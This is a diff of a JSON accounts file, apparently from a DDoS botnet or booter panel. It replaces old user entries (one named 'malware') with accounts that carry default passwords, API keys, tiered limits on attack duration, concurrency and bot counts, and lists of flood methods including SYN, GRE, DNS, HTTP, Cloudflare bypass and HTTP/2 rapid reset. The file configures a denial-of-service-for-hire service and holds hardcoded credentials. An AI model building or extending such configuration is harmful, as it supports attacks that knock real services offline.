@@ -1,32 +1,82 @@
 [
     {
-        "Username": "admin",
-        "Password": "changeme",
-        "Expire": "3024-12-25T10:30:00.0-04:00",
-        "Level": "Owner"
+        "username": "root",
+        "password": "changeme",
+        "api_key": "6aba0ee7e85c0316628c8c2561c0a75eb2ec0ac79479e359f8ae8b8aa0a5f1da",
+        "expire": "3024-12-25T00:00:00Z",
+        "level": "Owner",
+        "methods": [
+            "udpflood",
+            "tcpflood",
+            "syn",
+            "ack",
+            "gre",
+            "dns",
+            "http",
+            "https",
+            "cfbypass",
+            "rapidreset"
+        ]
     },
     {
-        "Username": "sin",
-        "Password": "smokedyoweed",
-        "Expire": "3024-12-25T10:30:00.0-04:00",
-        "Level": "Owner"
+        "username": "admin",
+        "password": "test",
+        "api_key": "3d23e907d9ff4d3be117ce596dac881266e0b0967dab18f3d4adb8af55f09d0b",
+        "expire": "3024-12-25T00:00:00Z",
+        "level": "Admin",
+        "maxtime": 300,
+        "concurrents": 1,
+        "methods": [
+            "udpflood",
+            "tcpflood",
+            "syn",
+            "ack",
+            "gre",
+            "dns",
+            "http",
+            "https",
+            "cfbypass",
+            "rapidreset"
+        ]
     },
     {
-        "Username": "malware",
-        "Password": "pani23c798balls",
-        "Expire": "2025-04-13T05:56:22.0-04:00",
-        "Level": "Admin"
+        "username": "pro_user",
+        "password": "changeme",
+        "api_key": "bc663744acaa3268e30684186cff207a25576f3640703d62bb0e537591a5cd05",
+        "expire": "2027-01-01T00:00:00Z",
+        "level": "Pro",
+        "maxtime": 600,
+        "concurrents": 3,
+        "maxbots": 2000,
+        "methods": [
+            "udpflood",
+            "tcpflood",
+            "syn",
+            "ack",
+            "gre",
+            "dns",
+            "http",
+            "https",
+            "cfbypass",
+            "rapidreset"
+        ]
     },
     {
-        "Username": "viptest",
-        "Password": "bit23tc9080henstyle",
-        "Expire": "2026-06-20T07:25:44.0-04:00",
-        "Level": "Pro"
-    },
-    {
-        "Username": "basictest",
-        "Password": "ba65757ain",
-        "Expire": "2026-12-20T09:30:50.0-04:00",
-        "Level": "basic"
+        "username": "basic_user",
+        "password": "changeme",
+        "api_key": "f8a66a68fa026f428f18ccb77752592d0938f3957b08842ec43b11e248406abc",
+        "expire": "2027-01-01T00:00:00Z",
+        "level": "Basic",
+        "maxtime": 300,
+        "concurrents": 1,
+        "maxbots": 500,
+        "methods": [
+            "tcpflood",
+            "syn",
+            "ack",
+            "dns",
+            "http",
+            "https"
+        ]
     }
 ]
